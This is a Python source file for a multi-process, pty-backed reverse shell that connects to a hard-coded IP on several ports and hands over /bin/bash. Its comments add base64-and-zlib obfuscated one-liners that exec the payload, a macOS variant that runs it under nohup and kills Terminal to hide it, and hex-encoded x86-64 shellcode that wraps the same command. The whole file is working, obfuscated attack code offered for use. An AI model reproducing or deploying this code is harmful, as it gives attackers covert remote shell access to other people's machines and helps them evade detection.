# only use a py extension (no shabang)
# the program will discover if it is for 2.x or 3.x

# Programed by Scourge (a multi-threaded, pty'd version of the pentester monkey reverse shell)
# GNU GPLv3 licence

ip = ('10.11.0.96') # ip
port_start = 5550
low_port  = 0
high_port = 7 # the 2nd to highest port is what gets hit

import socket,pty,os,sys,re
# pty, not subprocess
from multiprocessing import Process

if sys.version_info.major == 2:
	import thread
else:
	import threading

def start_reverse_shell(ip, port) :
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
		s.connect((ip,port)) 
		os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2) 
		x=pty.spawn("/bin/bash")
    # pty, not subprocess
	except:
		pass

thread_ids  = []
for i in range(low_port, high_port) :
	new_thread = Process(target=start_reverse_shell, args= (ip, (port_start+i))) 
	new_thread.start()
	thread_ids.append(new_thread)

# ------------------------------------------------------------------------------------------------------------------------------------------------------
# For executing on a Remote Terminal
# Rmutate  -rt ./mreverse.py -py2
# python -c "import codecs;a=codecs.decode((codecs.decode(\"eJxtUk2P0zAQPde/YrQ9rCMib1tUEKAcVmiREOJD7N4QitxkkhgS2/K4tPn3O04ClVAvtvzG82bem1mDs/0IR0LQ4EfAc0RLxlmQ1gF1+qBtm4k1xA7BB9cGPcDJ9D3Uhir3BwOYBkwEQ9C4ADt1Br5eqrMQxkMB8na7Udut2qg3r24zWIPxwrsQS4o6RP6w3+83onenMqHAwEZ0pu3mZwGvYa69szVEBymEFGGKcs1TpyO0GIkjkUsOU4Bc9Rtj7uOYO8pppDygaIIbYDj20bCOComMbWFJ+DYjTNAAf1esK5lQGts4NehfLKkoYPdWrJaE2AXUtcCe8H+QaYWokYmSwjJgIsOSOux7aXw+9Z4Bp8Uw8rmiYu5XzZdcXvcfyo9fHp7y5fn49f2n8vHp+8P95wxSlqqctVhFmUgnzgl3pOqj30lSjenROpnlm+zdFXR7Fd1NJOeCvVPk9cnKm7uDsXcHTd1NJlZ4rtDH1LbXybBZc2lqSrP78VOkLTBgLATeHJR/J5vDv6lO2i2eyjmX0xb7JRvGsyyuGJcDh4jXKRkoLwv0wmST7AudmnDJrV5aU9p7tLW8/MqEEM/LRfvh\",'base64')),'zip');exec(a)"

# Rmutate  -rt ./mreverse.py -py2 200
# That does the same thing as above but limites the mtu size to 200 bytes by sending the data in smaller packets

# ------------------------------------------------------------------------------------------------------------------------------------------------------
# for executing as an OSX based shellcode

# Rmutate  -f6 ./mreverse.py -py2 -ocow
# -s "nohup python -c \"import codecs;a=codecs.decode((codecs.decode(\\\"eJxtUk1rGzEQPVu/YkgPkahQ1gYnpMseQkmhlLSh8S0EoezOetWuJaFR6vjfV/vROBRfJObNvMfMm2E2QAX8fFmo5VIV6vryXMAHsIEFH5OmZGLKBev1uih7v9cDChkoys5uuyms4CpTUoewcg0kD0MKKcGYtQT7ziTYYqKcSczuRpx8/RuTDOkgPUk6kIzI2uh3sHvpkw3R10hk3RZmwv2EMNtCrlZ/MJL1TlvXerUzv3yEqoLVJ7aY61MX0TQMe8L/wazKGsw6w3g64qCFmjrse26DHBsXkFkpHvK7oGrqVk0fn6ObL/rr99uNnMOHH5+/6YfNz9ubOwElqdo7h3Xig+SoKEpPqnkJK06qtT06z4UsTqLLk+hKlK9VdkxRMHvHzy6erbt4NtSdCbbA1xpDGtoNhqicJtW2oWFfj0+szQ5ZsA6icVvk/7Yp4W2T48gO93riZtrsOc8+5f1VJ/ySkFOUT2jwjR+P5qMVIrtwVFMjzMW7xpQJAV3Dj0XiL2S53hg=\\\",'base64')),'zip');exec(a)\">/dev/null 2>&1 & sleep .5 & killall Terminal" -jcp
# that output is sent to your clipboard

# Rmutate <paste>

# now to get the shellcode in a line format (note that the block shellcode wil be in your clipboard)
# Rmutate h h -cb -sc

# osx based shellcode
# "\x48\x31\xff\x48\x31\xf6\x48\xf7\xe7\x50\xeb\x28\x59\x51\x52\x66\x68\x2d\x63\x49\x89\xe0\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x52\x51\x41\x50\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xd3\xff\xff\xff\x6e\x6f\x68\x75\x70\x20\x70\x79\x74\x68\x6f\x6e\x20\x2d\x63\x20\x22\x69\x6d\x70\x6f\x72\x74\x20\x63\x6f\x64\x65\x63\x73\x3b\x61\x3d\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x28\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x5c\x22\x65\x4a\x78\x74\x55\x6b\x31\x72\x47\x7a\x45\x51\x50\x56\x75\x2f\x59\x6b\x67\x50\x6b\x61\x68\x51\x31\x67\x59\x6e\x70\x4d\x73\x65\x51\x6b\x6d\x68\x6c\x4c\x53\x68\x38\x53\x30\x45\x6f\x65\x7a\x4f\x65\x74\x57\x75\x4a\x61\x46\x52\x36\x76\x6a\x66\x56\x2f\x76\x52\x4f\x42\x52\x66\x4a\x4f\x62\x4e\x76\x4d\x66\x4d\x6d\x32\x45\x32\x51\x41\x58\x38\x66\x46\x6d\x6f\x35\x56\x49\x56\x36\x76\x72\x79\x58\x4d\x41\x48\x73\x49\x45\x46\x48\x35\x4f\x6d\x5a\x47\x4c\x4b\x42\x65\x76\x31\x75\x69\x68\x37\x76\x39\x63\x44\x43\x68\x6b\x6f\x79\x73\x35\x75\x75\x79\x6d\x73\x34\x43\x70\x54\x55\x6f\x65\x77\x63\x67\x30\x6b\x44\x30\x4d\x4b\x4b\x63\x47\x59\x74\x51\x54\x37\x7a\x69\x54\x59\x59\x71\x4b\x63\x53\x63\x7a\x75\x52\x70\x78\x38\x2f\x52\x75\x54\x44\x4f\x6b\x67\x50\x55\x6b\x36\x6b\x49\x7a\x49\x32\x75\x68\x33\x73\x48\x76\x70\x6b\x77\x33\x52\x31\x30\x68\x6b\x33\x52\x5a\x6d\x77\x76\x32\x45\x4d\x4e\x74\x43\x72\x6c\x5a\x2f\x4d\x4a\x4c\x31\x54\x6c\x76\x58\x65\x72\x55\x7a\x76\x33\x79\x45\x71\x6f\x4c\x56\x4a\x37\x61\x59\x36\x31\x4d\x58\x30\x54\x51\x4d\x65\x38\x4c\x2f\x77\x61\x7a\x4b\x47\x73\x77\x36\x77\x33\x67\x36\x34\x71\x43\x46\x6d\x6a\x72\x73\x65\x32\x36\x44\x48\x42\x73\x58\x6b\x46\x6b\x70\x48\x76\x4b\x37\x6f\x47\x72\x71\x56\x6b\x30\x66\x6e\x36\x4f\x62\x4c\x2f\x72\x72\x39\x39\x75\x4e\x6e\x4d\x4f\x48\x48\x35\x2b\x2f\x36\x59\x66\x4e\x7a\x39\x75\x62\x4f\x77\x45\x6c\x71\x64\x6f\x37\x68\x33\x58\x69\x67\x2b\x53\x6f\x4b\x45\x70\x50\x71\x6e\x6b\x4a\x4b\x30\x36\x71\x74\x54\x30\x36\x7a\x34\x55\x73\x54\x71\x4c\x4c\x6b\x2b\x68\x4b\x6c\x4b\x39\x56\x64\x6b\x78\x52\x4d\x48\x76\x48\x7a\x79\x36\x65\x72\x62\x74\x34\x4e\x74\x53\x64\x43\x62\x62\x41\x31\x78\x70\x44\x47\x74\x6f\x4e\x68\x71\x69\x63\x4a\x74\x57\x32\x6f\x57\x46\x66\x6a\x30\x2b\x73\x7a\x51\x35\x5a\x73\x41\x36\x69\x63\x56\x76\x6b\x2f\x37\x59\x70\x34\x57\x32\x54\x34\x38\x67\x4f\x39\x33\x72\x69\x5a\x74\x72\x73\x4f\x63\x38\x2b\x35\x66\x31\x56\x4a\x2f\x79\x53\x6b\x46\x4f\x55\x54\x32\x6a\x77\x6a\x52\x2b\x50\x35\x71\x4d\x56\x49\x72\x74\x77\x56\x46\x4d\x6a\x7a\x4d\x57\x37\x78\x70\x51\x4a\x41\x56\x33\x44\x6a\x30\x58\x69\x4c\x32\x53\x35\x33\x68\x67\x3d\x5c\x22\x2c\x27\x62\x61\x73\x65\x36\x34\x27\x29\x29\x2c\x27\x7a\x69\x70\x27\x29\x3b\x65\x78\x65\x63\x28\x61\x29\x22\x3e\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x32\x3e\x26\x31\x20\x26\x20\x73\x6c\x65\x65\x70\x20\x2e\x35\x20\x26\x20\x6b\x69\x6c\x6c\x61\x6c\x6c\x20\x54\x65\x72\x6d\x69\x6e\x61\x6c"
